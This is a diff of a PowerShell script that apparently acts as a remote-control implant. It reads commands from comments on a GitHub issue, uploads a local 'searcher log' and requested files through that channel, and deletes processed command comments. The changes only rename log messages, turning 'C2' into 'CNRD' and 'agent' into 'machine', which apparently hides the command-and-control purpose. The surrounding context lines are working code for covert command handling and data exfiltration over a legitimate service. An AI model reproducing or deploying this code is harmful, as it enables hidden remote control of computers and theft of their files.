@@ -19,8 +19,8 @@ function Update-SearcherLog
     catch 
     {
         Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to clear the old searcher log. Exiting. Error: " + $Error)
-	    Write-Console -Body "Exception thrown trying to clear the old searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
-	    #Write-Host "DEBUG: Exception thrown trying to clear the old searcher log. Notified C2. Exiting."; Start-Sleep -s 600
+	    Write-Console -Body "Exception thrown trying to clear the old searcher log. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	    #Write-Host "DEBUG: Exception thrown trying to clear the old searcher log. Notified CNRD. Exiting."; Start-Sleep -s 600
 	    Exit
     }
     
@@ -67,8 +67,8 @@ function Update-SearcherLog
     catch
     {
         Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to create the searcher log. Exiting. Error: " + $Error)
-	    Write-Console -Body "Exception thrown trying to create the searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
-	    #Write-Host "DEBUG: Exception thrown trying to create the searcher log. Notified C2. Exiting."; Start-Sleep -s 600
+	    Write-Console -Body "Exception thrown trying to create the searcher log. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	    #Write-Host "DEBUG: Exception thrown trying to create the searcher log. Notified CNRD. Exiting."; Start-Sleep -s 600
 	    Exit
     }
 }
@@ -107,24 +107,24 @@ try
 catch
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to find and/or create the searcher log. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to find and/or create the searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to find and/or create the searcher log. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to find and/or create the searcher log. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to find and/or create the searcher log. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
-#Get all the comments for this agent. The default sort has least recent comments first, so we need to reverse that to loop through the most recent comments first
+#Get all the comments for this machine. The default sort has least recent comments first, so we need to reverse that to loop through the most recent comments first
 try 
 {
     $comments = Get-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -Issue $issueNumber
     [array]::Reverse($comments)
-    Write-Console -Body ("Searcher downloaded the comments for this agent.") -IssueNumber $issueNumber
-    #Write-Host "DEBUG: Searcher downloaded the comments for this agent."
+    Write-Console -Body ("Searcher downloaded the comments for this machine.") -IssueNumber $issueNumber
+    #Write-Host "DEBUG: Searcher downloaded the comments for this machine."
 }
 catch 
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to get comments with searcher. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to get comments with searcher. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to get comments with searcher. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to get comments with searcher. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to get comments with searcher. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -151,8 +151,8 @@ try
 catch 
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to identify the most recent searcher log upload. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to identify the most recent searcher log upload. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to identify the most recent searcher log upload. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to identify the most recent searcher log upload. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to identify the most recent searcher log upload. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -161,8 +161,8 @@ try
 {
     If($mostRecentSearcherLogID -eq 0)
     {
-        Write-Console -Body ("Couldn't identify a searcher log associated with this agent. Uploading...") -IssueNumber $issueNumber
-        #Write-Host "DEBUG: Couldn't identify a searcher log associated with this agent. Uploading..."
+        Write-Console -Body ("Couldn't identify a searcher log associated with this machine. Uploading...") -IssueNumber $issueNumber
+        #Write-Host "DEBUG: Couldn't identify a searcher log associated with this machine. Uploading..."
         Send-PackageMessage -Package "SEARCHER" -IssueNumber $issueNumber -Body (Get-Content -Path $searcherLogPath -Raw)
         Write-Console -Body ("Uploaded complete.") -IssueNumber $issueNumber
         #Write-Host "DEBUG: Upload complete."
@@ -171,8 +171,8 @@ try
 catch 
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to upload a new searcher log. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to upload a new searcher log. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to upload a new searcher log. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to upload a new searcher log. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to upload a new searcher log. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
@@ -210,8 +210,8 @@ try
                 {
                     Remove-GitHubComment -OwnerName BeinnUais1 -RepositoryName ceannard1 -CommentID $comment.ID
                     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command.")
-                    Write-Console -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting.") -IssueNumber $issueNumber
-                    #Write-Host ("DEBUG: Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified C2. Exiting."); Start-Sleep -s 600
+                    Write-Console -Body ("Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified CNRD. Exiting.") -IssueNumber $issueNumber
+                    #Write-Host ("DEBUG: Unable to locate the target file for UPLOAD_FILE command with comment ID " + $comment.ID + ". Deleted that command. Notified CNRD. Exiting."); Start-Sleep -s 600
                     Exit
                 }
             }
@@ -242,8 +242,8 @@ try
 catch 
 {
     Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to process searcher commands. Exiting. Error: " + $Error)
-	Write-Console -Body "Exception thrown trying to process searcher commands. Notified C2. Exiting." -IssueNumber $issueNumber
-	#Write-Host "DEBUG: Exception thrown trying to process searcher commands. Notified C2. Exiting."; Start-Sleep -s 600
+	Write-Console -Body "Exception thrown trying to process searcher commands. Notified CNRD. Exiting." -IssueNumber $issueNumber
+	#Write-Host "DEBUG: Exception thrown trying to process searcher commands. Notified CNRD. Exiting."; Start-Sleep -s 600
 	Exit
 }
 
